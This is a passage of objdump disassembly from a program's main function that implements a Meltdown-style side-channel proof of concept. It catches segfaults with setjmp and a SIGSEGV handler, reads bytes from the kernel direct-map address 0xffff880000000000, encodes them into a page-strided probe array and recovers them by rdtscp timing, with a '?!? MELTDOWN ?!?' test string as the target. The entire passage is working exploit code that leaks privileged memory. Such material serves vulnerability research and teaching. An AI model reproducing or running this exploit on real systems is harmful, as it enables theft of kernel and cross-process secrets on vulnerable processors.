     f55:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
     f5b:	83 bd 2c ff ff ff 02 	cmpl   $0x2,-0xd4(%rbp)
     f62:	74 14                	je     f78 <main+0x74>
     f64:	b8 00 00 00 00       	mov    $0x0,%eax
     f69:	e8 47 ff ff ff       	callq  eb5 <print_usage_message>
     f6e:	b8 01 00 00 00       	mov    $0x1,%eax
     f73:	e9 6f 08 00 00       	jmpq   17e7 <main+0x8e3>
     f78:	83 bd 7c ff ff ff 00 	cmpl   $0x0,-0x84(%rbp)
     f7f:	75 30                	jne    fb1 <main+0xad>
     f81:	48 8d 3d 70 0a 00 00 	lea    0xa70(%rip),%rdi        # 19f8 <_IO_stdin_used+0x178>
     f88:	e8 33 f9 ff ff       	callq  8c0 <puts@plt>
     f8d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     f91:	48 89 c7             	mov    %rax,%rdi
     f94:	e8 07 fe ff ff       	callq  da0 <test_flushprobe>
     f99:	48 8d 3d 80 0a 00 00 	lea    0xa80(%rip),%rdi        # 1a20 <_IO_stdin_used+0x1a0>
     fa0:	e8 1b f9 ff ff       	callq  8c0 <puts@plt>
     fa5:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     fa9:	48 89 c7             	mov    %rax,%rdi
     fac:	e8 ef fd ff ff       	callq  da0 <test_flushprobe>
     fb1:	83 bd 7c ff ff ff 01 	cmpl   $0x1,-0x84(%rbp)
     fb8:	0f 85 2a 01 00 00    	jne    10e8 <main+0x1e4>
     fbe:	48 8d 35 73 fd ff ff 	lea    -0x28d(%rip),%rsi        # d38 <trycatch_segfault_handler>
     fc5:	bf 0b 00 00 00       	mov    $0xb,%edi
     fca:	e8 41 f9 ff ff       	callq  910 <signal@plt>
     fcf:	48 b8 00 00 00 00 00 	movabs $0xffff880000000000,%rax
     fd6:	88 ff ff 
     fd9:	48 89 45 90          	mov    %rax,-0x70(%rbp)
     fdd:	48 8d 3d 5c 10 20 00 	lea    0x20105c(%rip),%rdi        # 202040 <trycatch_buf>
     fe4:	e8 17 f9 ff ff       	callq  900 <_setjmp@plt>
     fe9:	85 c0                	test   %eax,%eax
     feb:	75 2a                	jne    1017 <main+0x113>
     fed:	48 8b 75 90          	mov    -0x70(%rbp),%rsi
     ff1:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     ff5:	48 89 c1             	mov    %rax,%rcx
     ff8:	48 89 f3             	mov    %rsi,%rbx
     ffb:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    1002:	0f ae f0             	mfence 
    1005:	48 0f b6 03          	movzbq (%rbx),%rax
    1009:	48 c1 e0 0c          	shl    $0xc,%rax
    100d:	48 01 c1             	add    %rax,%rcx
    1010:	48 8b 11             	mov    (%rcx),%rdx
    1013:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    1017:	bf 00 08 00 00       	mov    $0x800,%edi
    101c:	e8 1f f9 ff ff       	callq  940 <malloc@plt>
    1021:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1025:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1029:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    102d:	c7 85 3c ff ff ff 00 	movl   $0x0,-0xc4(%rbp)
    1034:	00 00 00 
    1037:	eb 4c                	jmp    1085 <main+0x181>
    1039:	8b 85 3c ff ff ff    	mov    -0xc4(%rbp),%eax
    103f:	48 98                	cltq   
    1041:	48 c1 e0 0c          	shl    $0xc,%rax
    1045:	48 89 c2             	mov    %rax,%rdx
    1048:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    104c:	48 01 d0             	add    %rdx,%rax
    104f:	48 89 c3             	mov    %rax,%rbx
    1052:	0f 01 f9             	rdtscp 
    1055:	49 89 c2             	mov    %rax,%r10
    1058:	48 8b 0b             	mov    (%rbx),%rcx
    105b:	0f 01 f9             	rdtscp 
    105e:	4c 29 d0             	sub    %r10,%rax
    1061:	48 89 c3             	mov    %rax,%rbx
    1064:	8b 85 3c ff ff ff    	mov    -0xc4(%rbp),%eax
    106a:	48 98                	cltq   
    106c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1073:	00 
    1074:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1078:	48 01 d0             	add    %rdx,%rax
    107b:	48 89 18             	mov    %rbx,(%rax)
    107e:	83 85 3c ff ff ff 01 	addl   $0x1,-0xc4(%rbp)
    1085:	81 bd 3c ff ff ff ff 	cmpl   $0xff,-0xc4(%rbp)
    108c:	00 00 00 
    108f:	7e a8                	jle    1039 <main+0x135>
    1091:	c7 85 40 ff ff ff 00 	movl   $0x0,-0xc0(%rbp)
    1098:	00 00 00 
    109b:	eb 3a                	jmp    10d7 <main+0x1d3>
    109d:	8b 85 40 ff ff ff    	mov    -0xc0(%rbp),%eax
    10a3:	48 98                	cltq   
    10a5:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    10ac:	00 
    10ad:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    10b1:	48 01 d0             	add    %rdx,%rax
    10b4:	48 8b 10             	mov    (%rax),%rdx
    10b7:	8b 85 40 ff ff ff    	mov    -0xc0(%rbp),%eax
    10bd:	89 c6                	mov    %eax,%esi
    10bf:	48 8d 3d 81 09 00 00 	lea    0x981(%rip),%rdi        # 1a47 <_IO_stdin_used+0x1c7>
    10c6:	b8 00 00 00 00       	mov    $0x0,%eax
    10cb:	e8 10 f8 ff ff       	callq  8e0 <printf@plt>
    10d0:	83 85 40 ff ff ff 01 	addl   $0x1,-0xc0(%rbp)
    10d7:	81 bd 40 ff ff ff ff 	cmpl   $0xff,-0xc0(%rbp)
    10de:	00 00 00 
    10e1:	7e ba                	jle    109d <main+0x199>
    10e3:	e9 e2 06 00 00       	jmpq   17ca <main+0x8c6>
    10e8:	83 bd 7c ff ff ff 02 	cmpl   $0x2,-0x84(%rbp)
    10ef:	0f 85 50 03 00 00    	jne    1445 <main+0x541>
    10f5:	bf 12 00 00 00       	mov    $0x12,%edi
    10fa:	e8 41 f8 ff ff       	callq  940 <malloc@plt>
    10ff:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    1103:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1107:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    110b:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    110f:	48 bb 3f 21 3f 20 4d 	movabs $0x544c454d203f213f,%rbx
    1116:	45 4c 54 
    1119:	48 be 44 4f 57 4e 20 	movabs $0x3f213f204e574f44,%rsi
    1120:	3f 21 3f 
    1123:	48 89 18             	mov    %rbx,(%rax)
    1126:	48 89 70 08          	mov    %rsi,0x8(%rax)
    112a:	c6 40 10 00          	movb   $0x0,0x10(%rax)
    112e:	c7 85 44 ff ff ff 00 	movl   $0x0,-0xbc(%rbp)
    1135:	00 00 00 
    1138:	e9 ea 02 00 00       	jmpq   1427 <main+0x523>
    113d:	bf 00 08 00 00       	mov    $0x800,%edi
    1142:	e8 f9 f7 ff ff       	callq  940 <malloc@plt>
    1147:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    114b:	c7 85 48 ff ff ff 00 	movl   $0x0,-0xb8(%rbp)
    1152:	00 00 00 
    1155:	eb 25                	jmp    117c <main+0x278>
    1157:	8b 85 48 ff ff ff    	mov    -0xb8(%rbp),%eax
    115d:	48 98                	cltq   
    115f:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1166:	00 
    1167:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    116b:	48 01 d0             	add    %rdx,%rax
    116e:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1175:	83 85 48 ff ff ff 01 	addl   $0x1,-0xb8(%rbp)
    117c:	81 bd 48 ff ff ff ff 	cmpl   $0xff,-0xb8(%rbp)
    1183:	00 00 00 
    1186:	7e cf                	jle    1157 <main+0x253>
    1188:	c7 85 4c ff ff ff 64 	movl   $0x64,-0xb4(%rbp)
    118f:	00 00 00 
    1192:	e9 88 01 00 00       	jmpq   131f <main+0x41b>
    1197:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    119b:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    119f:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    11a3:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    11a7:	48 89 c1             	mov    %rax,%rcx
    11aa:	48 89 f3             	mov    %rsi,%rbx
    11ad:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    11b4:	0f ae f0             	mfence 
    11b7:	48 0f b6 03          	movzbq (%rbx),%rax
    11bb:	48 c1 e0 0c          	shl    $0xc,%rax
    11bf:	48 01 c1             	add    %rax,%rcx
    11c2:	48 8b 11             	mov    (%rcx),%rdx
    11c5:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    11c9:	bf 00 08 00 00       	mov    $0x800,%edi
    11ce:	e8 6d f7 ff ff       	callq  940 <malloc@plt>
    11d3:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    11d7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    11db:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    11df:	c7 85 50 ff ff ff 00 	movl   $0x0,-0xb0(%rbp)
    11e6:	00 00 00 
    11e9:	eb 52                	jmp    123d <main+0x339>
    11eb:	8b 85 50 ff ff ff    	mov    -0xb0(%rbp),%eax
    11f1:	48 98                	cltq   
    11f3:	48 c1 e0 0c          	shl    $0xc,%rax
    11f7:	48 89 c2             	mov    %rax,%rdx
    11fa:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    11fe:	48 01 d0             	add    %rdx,%rax
    1201:	48 89 c3             	mov    %rax,%rbx
    1204:	0f ae f0             	mfence 
    1207:	0f ae e8             	lfence 
    120a:	0f 01 f9             	rdtscp 
    120d:	49 89 c2             	mov    %rax,%r10
    1210:	48 8b 0b             	mov    (%rbx),%rcx
    1213:	0f 01 f9             	rdtscp 
    1216:	4c 29 d0             	sub    %r10,%rax
    1219:	48 89 c3             	mov    %rax,%rbx
    121c:	8b 85 50 ff ff ff    	mov    -0xb0(%rbp),%eax
    1222:	48 98                	cltq   
    1224:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    122b:	00 
    122c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1230:	48 01 d0             	add    %rdx,%rax
    1233:	48 89 18             	mov    %rbx,(%rax)
    1236:	83 85 50 ff ff ff 01 	addl   $0x1,-0xb0(%rbp)
    123d:	81 bd 50 ff ff ff ff 	cmpl   $0xff,-0xb0(%rbp)
    1244:	00 00 00 
    1247:	7e a2                	jle    11eb <main+0x2e7>
    1249:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
    1250:	00 00 00 
    1253:	e9 98 00 00 00       	jmpq   12f0 <main+0x3ec>
    1258:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    125e:	48 98                	cltq   
    1260:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1267:	00 
    1268:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    126c:	48 01 d0             	add    %rdx,%rax
    126f:	48 8b 00             	mov    (%rax),%rax
    1272:	48 3d c8 00 00 00    	cmp    $0xc8,%rax
    1278:	76 1e                	jbe    1298 <main+0x394>
    127a:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    1280:	48 98                	cltq   
    1282:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1289:	00 
    128a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    128e:	48 01 d0             	add    %rdx,%rax
    1291:	48 c7 00 c8 00 00 00 	movq   $0xc8,(%rax)
    1298:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    129e:	48 98                	cltq   
    12a0:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    12a7:	00 
    12a8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12ac:	48 01 d0             	add    %rdx,%rax
    12af:	48 8b 08             	mov    (%rax),%rcx
    12b2:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    12b8:	48 98                	cltq   
    12ba:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    12c1:	00 
    12c2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    12c6:	48 01 d0             	add    %rdx,%rax
    12c9:	48 8b 10             	mov    (%rax),%rdx
    12cc:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    12d2:	48 98                	cltq   
    12d4:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
    12db:	00 
    12dc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12e0:	48 01 f0             	add    %rsi,%rax
    12e3:	48 01 ca             	add    %rcx,%rdx
    12e6:	48 89 10             	mov    %rdx,(%rax)
    12e9:	83 85 54 ff ff ff 01 	addl   $0x1,-0xac(%rbp)
    12f0:	81 bd 54 ff ff ff ff 	cmpl   $0xff,-0xac(%rbp)
    12f7:	00 00 00 
    12fa:	0f 8e 58 ff ff ff    	jle    1258 <main+0x354>
    1300:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1304:	48 89 c7             	mov    %rax,%rdi
    1307:	e8 a4 f5 ff ff       	callq  8b0 <free@plt>
    130c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1310:	48 89 c7             	mov    %rax,%rdi
    1313:	e8 50 fa ff ff       	callq  d68 <flushprobe>
    1318:	83 ad 4c ff ff ff 01 	subl   $0x1,-0xb4(%rbp)
    131f:	83 bd 4c ff ff ff 00 	cmpl   $0x0,-0xb4(%rbp)
    1326:	0f 85 6b fe ff ff    	jne    1197 <main+0x293>
    132c:	48 b8 00 e4 0b 54 02 	movabs $0x2540be400,%rax
    1333:	00 00 00 
    1336:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    133a:	c7 85 58 ff ff ff ff 	movl   $0xffffffff,-0xa8(%rbp)
    1341:	ff ff ff 
    1344:	c7 85 5c ff ff ff 00 	movl   $0x0,-0xa4(%rbp)
    134b:	00 00 00 
    134e:	e9 81 00 00 00       	jmpq   13d4 <main+0x4d0>
    1353:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    1359:	48 98                	cltq   
    135b:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1362:	00 
    1363:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1367:	48 01 d0             	add    %rdx,%rax
    136a:	48 8b 00             	mov    (%rax),%rax
    136d:	48 c1 e8 02          	shr    $0x2,%rax
    1371:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    1378:	c2 f5 28 
    137b:	48 f7 e2             	mul    %rdx
    137e:	48 89 d0             	mov    %rdx,%rax
    1381:	48 c1 e8 02          	shr    $0x2,%rax
    1385:	48 39 45 a0          	cmp    %rax,-0x60(%rbp)
    1389:	76 42                	jbe    13cd <main+0x4c9>
    138b:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    1391:	48 98                	cltq   
    1393:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    139a:	00 
    139b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    139f:	48 01 d0             	add    %rdx,%rax
    13a2:	48 8b 00             	mov    (%rax),%rax
    13a5:	48 c1 e8 02          	shr    $0x2,%rax
    13a9:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    13b0:	c2 f5 28 
    13b3:	48 f7 e2             	mul    %rdx
    13b6:	48 89 d0             	mov    %rdx,%rax
    13b9:	48 c1 e8 02          	shr    $0x2,%rax
    13bd:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    13c1:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    13c7:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%rbp)
    13cd:	83 85 5c ff ff ff 01 	addl   $0x1,-0xa4(%rbp)
    13d4:	81 bd 5c ff ff ff ff 	cmpl   $0xff,-0xa4(%rbp)
    13db:	00 00 00 
    13de:	0f 8e 6f ff ff ff    	jle    1353 <main+0x44f>
    13e4:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
    13e8:	8b 8d 58 ff ff ff    	mov    -0xa8(%rbp),%ecx
    13ee:	8b 95 58 ff ff ff    	mov    -0xa8(%rbp),%edx
    13f4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    13f8:	49 89 f0             	mov    %rsi,%r8
    13fb:	48 89 c6             	mov    %rax,%rsi
    13fe:	48 8d 3d 53 06 00 00 	lea    0x653(%rip),%rdi        # 1a58 <_IO_stdin_used+0x1d8>
    1405:	b8 00 00 00 00       	mov    $0x0,%eax
    140a:	e8 d1 f4 ff ff       	callq  8e0 <printf@plt>
    140f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1413:	48 89 c7             	mov    %rax,%rdi
    1416:	e8 95 f4 ff ff       	callq  8b0 <free@plt>
    141b:	48 83 45 98 01       	addq   $0x1,-0x68(%rbp)
    1420:	83 85 44 ff ff ff 01 	addl   $0x1,-0xbc(%rbp)
    1427:	83 bd 44 ff ff ff 0f 	cmpl   $0xf,-0xbc(%rbp)
    142e:	0f 8e 09 fd ff ff    	jle    113d <main+0x239>
    1434:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1438:	48 89 c7             	mov    %rax,%rdi
    143b:	e8 70 f4 ff ff       	callq  8b0 <free@plt>
    1440:	e9 85 03 00 00       	jmpq   17ca <main+0x8c6>
    1445:	83 bd 7c ff ff ff 03 	cmpl   $0x3,-0x84(%rbp)
    144c:	0f 85 78 03 00 00    	jne    17ca <main+0x8c6>
    1452:	48 8d 35 df f8 ff ff 	lea    -0x721(%rip),%rsi        # d38 <trycatch_segfault_handler>
    1459:	bf 0b 00 00 00       	mov    $0xb,%edi
    145e:	e8 ad f4 ff ff       	callq  910 <signal@plt>
    1463:	bf 12 00 00 00       	mov    $0x12,%edi
    1468:	e8 d3 f4 ff ff       	callq  940 <malloc@plt>
    146d:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1471:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1475:	48 b9 3f 21 3f 20 4d 	movabs $0x544c454d203f213f,%rcx
    147c:	45 4c 54 
    147f:	48 bb 44 4f 57 4e 20 	movabs $0x3f213f204e574f44,%rbx
    1486:	3f 21 3f 
    1489:	48 89 08             	mov    %rcx,(%rax)
    148c:	48 89 58 08          	mov    %rbx,0x8(%rax)
    1490:	c6 40 10 00          	movb   $0x0,0x10(%rax)
    1494:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1498:	48 89 c7             	mov    %rax,%rdi
    149b:	e8 20 f7 ff ff       	callq  bc0 <get_phys_addr>
    14a0:	48 89 c2             	mov    %rax,%rdx
    14a3:	48 b8 00 00 00 00 00 	movabs $0xffff880000000000,%rax
    14aa:	88 ff ff 
    14ad:	48 01 d0             	add    %rdx,%rax
    14b0:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    14b4:	c7 85 60 ff ff ff 96 	movl   $0x96,-0xa0(%rbp)
    14bb:	00 00 00 
    14be:	e9 fa 02 00 00       	jmpq   17bd <main+0x8b9>
    14c3:	bf 00 08 00 00       	mov    $0x800,%edi
    14c8:	e8 73 f4 ff ff       	callq  940 <malloc@plt>
    14cd:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    14d1:	c7 85 64 ff ff ff 00 	movl   $0x0,-0x9c(%rbp)
    14d8:	00 00 00 
    14db:	eb 25                	jmp    1502 <main+0x5fe>
    14dd:	8b 85 64 ff ff ff    	mov    -0x9c(%rbp),%eax
    14e3:	48 98                	cltq   
    14e5:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    14ec:	00 
    14ed:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    14f1:	48 01 d0             	add    %rdx,%rax
    14f4:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    14fb:	83 85 64 ff ff ff 01 	addl   $0x1,-0x9c(%rbp)
    1502:	81 bd 64 ff ff ff ff 	cmpl   $0xff,-0x9c(%rbp)
    1509:	00 00 00 
    150c:	7e cf                	jle    14dd <main+0x5d9>
    150e:	c7 85 68 ff ff ff 64 	movl   $0x64,-0x98(%rbp)
    1515:	00 00 00 
    1518:	e9 98 01 00 00       	jmpq   16b5 <main+0x7b1>
    151d:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1521:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    1525:	48 8d 3d 14 0b 20 00 	lea    0x200b14(%rip),%rdi        # 202040 <trycatch_buf>
    152c:	e8 cf f3 ff ff       	callq  900 <_setjmp@plt>
    1531:	85 c0                	test   %eax,%eax
    1533:	75 2a                	jne    155f <main+0x65b>
    1535:	48 8b 75 a8          	mov    -0x58(%rbp),%rsi
    1539:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    153d:	48 89 c1             	mov    %rax,%rcx
    1540:	48 89 f3             	mov    %rsi,%rbx
    1543:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    154a:	0f ae f0             	mfence 
    154d:	48 0f b6 03          	movzbq (%rbx),%rax
    1551:	48 c1 e0 0c          	shl    $0xc,%rax
    1555:	48 01 c1             	add    %rax,%rcx
    1558:	48 8b 11             	mov    (%rcx),%rdx
    155b:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    155f:	bf 00 08 00 00       	mov    $0x800,%edi
    1564:	e8 d7 f3 ff ff       	callq  940 <malloc@plt>
    1569:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    156d:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1571:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    1575:	c7 85 6c ff ff ff 00 	movl   $0x0,-0x94(%rbp)
    157c:	00 00 00 
    157f:	eb 52                	jmp    15d3 <main+0x6cf>
    1581:	8b 85 6c ff ff ff    	mov    -0x94(%rbp),%eax
    1587:	48 98                	cltq   
    1589:	48 c1 e0 0c          	shl    $0xc,%rax
    158d:	48 89 c2             	mov    %rax,%rdx
    1590:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    1594:	48 01 d0             	add    %rdx,%rax
    1597:	48 89 c3             	mov    %rax,%rbx
    159a:	0f ae f0             	mfence 
    159d:	0f ae e8             	lfence 
    15a0:	0f 01 f9             	rdtscp 
    15a3:	49 89 c2             	mov    %rax,%r10
    15a6:	48 8b 0b             	mov    (%rbx),%rcx
    15a9:	0f 01 f9             	rdtscp 
    15ac:	4c 29 d0             	sub    %r10,%rax
    15af:	48 89 c3             	mov    %rax,%rbx
    15b2:	8b 85 6c ff ff ff    	mov    -0x94(%rbp),%eax
    15b8:	48 98                	cltq   
    15ba:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    15c1:	00 
    15c2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    15c6:	48 01 d0             	add    %rdx,%rax
    15c9:	48 89 18             	mov    %rbx,(%rax)
    15cc:	83 85 6c ff ff ff 01 	addl   $0x1,-0x94(%rbp)
    15d3:	81 bd 6c ff ff ff ff 	cmpl   $0xff,-0x94(%rbp)
    15da:	00 00 00 
    15dd:	7e a2                	jle    1581 <main+0x67d>
    15df:	c7 85 70 ff ff ff 00 	movl   $0x0,-0x90(%rbp)
    15e6:	00 00 00 
    15e9:	e9 98 00 00 00       	jmpq   1686 <main+0x782>
    15ee:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    15f4:	48 98                	cltq   
    15f6:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    15fd:	00 
    15fe:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1602:	48 01 d0             	add    %rdx,%rax
    1605:	48 8b 00             	mov    (%rax),%rax
    1608:	48 3d c8 00 00 00    	cmp    $0xc8,%rax
    160e:	76 1e                	jbe    162e <main+0x72a>
    1610:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1616:	48 98                	cltq   
    1618:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    161f:	00 
    1620:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1624:	48 01 d0             	add    %rdx,%rax
    1627:	48 c7 00 c8 00 00 00 	movq   $0xc8,(%rax)
    162e:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1634:	48 98                	cltq   
    1636:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    163d:	00 
    163e:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1642:	48 01 d0             	add    %rdx,%rax
    1645:	48 8b 08             	mov    (%rax),%rcx
    1648:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    164e:	48 98                	cltq   
    1650:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1657:	00 
    1658:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    165c:	48 01 d0             	add    %rdx,%rax
    165f:	48 8b 10             	mov    (%rax),%rdx
    1662:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1668:	48 98                	cltq   
    166a:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
    1671:	00 
    1672:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1676:	48 01 f0             	add    %rsi,%rax
    1679:	48 01 ca             	add    %rcx,%rdx
    167c:	48 89 10             	mov    %rdx,(%rax)
    167f:	83 85 70 ff ff ff 01 	addl   $0x1,-0x90(%rbp)
    1686:	81 bd 70 ff ff ff ff 	cmpl   $0xff,-0x90(%rbp)
    168d:	00 00 00 
    1690:	0f 8e 58 ff ff ff    	jle    15ee <main+0x6ea>
    1696:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    169a:	48 89 c7             	mov    %rax,%rdi
    169d:	e8 0e f2 ff ff       	callq  8b0 <free@plt>
    16a2:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    16a6:	48 89 c7             	mov    %rax,%rdi
    16a9:	e8 ba f6 ff ff       	callq  d68 <flushprobe>
    16ae:	83 ad 68 ff ff ff 01 	subl   $0x1,-0x98(%rbp)
    16b5:	83 bd 68 ff ff ff 00 	cmpl   $0x0,-0x98(%rbp)
    16bc:	0f 85 5b fe ff ff    	jne    151d <main+0x619>
    16c2:	48 b8 00 e4 0b 54 02 	movabs $0x2540be400,%rax
    16c9:	00 00 00 
    16cc:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    16d0:	c7 85 74 ff ff ff ff 	movl   $0xffffffff,-0x8c(%rbp)
    16d7:	ff ff ff 
    16da:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%rbp)
    16e1:	00 00 00 
    16e4:	e9 81 00 00 00       	jmpq   176a <main+0x866>
    16e9:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    16ef:	48 98                	cltq   
    16f1:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    16f8:	00 
    16f9:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    16fd:	48 01 d0             	add    %rdx,%rax
    1700:	48 8b 00             	mov    (%rax),%rax
    1703:	48 c1 e8 02          	shr    $0x2,%rax
    1707:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    170e:	c2 f5 28 
    1711:	48 f7 e2             	mul    %rdx
    1714:	48 89 d0             	mov    %rdx,%rax
    1717:	48 c1 e8 02          	shr    $0x2,%rax
    171b:	48 39 45 b8          	cmp    %rax,-0x48(%rbp)
    171f:	76 42                	jbe    1763 <main+0x85f>
    1721:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    1727:	48 98                	cltq   
    1729:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1730:	00 
    1731:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1735:	48 01 d0             	add    %rdx,%rax
    1738:	48 8b 00             	mov    (%rax),%rax
    173b:	48 c1 e8 02          	shr    $0x2,%rax
    173f:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    1746:	c2 f5 28 
    1749:	48 f7 e2             	mul    %rdx
    174c:	48 89 d0             	mov    %rdx,%rax
    174f:	48 c1 e8 02          	shr    $0x2,%rax
    1753:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    1757:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    175d:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%rbp)
    1763:	83 85 78 ff ff ff 01 	addl   $0x1,-0x88(%rbp)
    176a:	81 bd 78 ff ff ff ff 	cmpl   $0xff,-0x88(%rbp)
    1771:	00 00 00 
    1774:	0f 8e 6f ff ff ff    	jle    16e9 <main+0x7e5>
    177a:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
    177e:	8b 8d 74 ff ff ff    	mov    -0x8c(%rbp),%ecx
    1784:	8b 95 74 ff ff ff    	mov    -0x8c(%rbp),%edx
    178a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    178e:	49 89 f0             	mov    %rsi,%r8
    1791:	48 89 c6             	mov    %rax,%rsi
    1794:	48 8d 3d bd 02 00 00 	lea    0x2bd(%rip),%rdi        # 1a58 <_IO_stdin_used+0x1d8>
    179b:	b8 00 00 00 00       	mov    $0x0,%eax
    17a0:	e8 3b f1 ff ff       	callq  8e0 <printf@plt>
    17a5:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    17a9:	48 89 c7             	mov    %rax,%rdi
    17ac:	e8 ff f0 ff ff       	callq  8b0 <free@plt>
